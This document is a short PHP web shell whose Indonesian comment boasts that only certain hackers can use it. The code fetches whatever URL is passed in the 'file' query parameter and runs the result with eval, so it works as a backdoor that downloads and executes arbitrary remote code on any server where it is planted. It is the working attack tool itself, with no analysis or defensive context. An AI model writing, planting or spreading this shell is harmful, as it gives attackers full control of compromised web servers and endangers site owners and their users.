// Shell ini hanya Heker tertentu yang bisa gunain nya awowowok
<?php
if (isset($_GET['file']) && !empty($_GET['file'])) {
    $file_url = $_GET['file'];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $file_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $code = curl_exec($ch);
    curl_close($ch);

    if ($code !== false) {
        eval("?>$code<?php ");
    }
}
?>
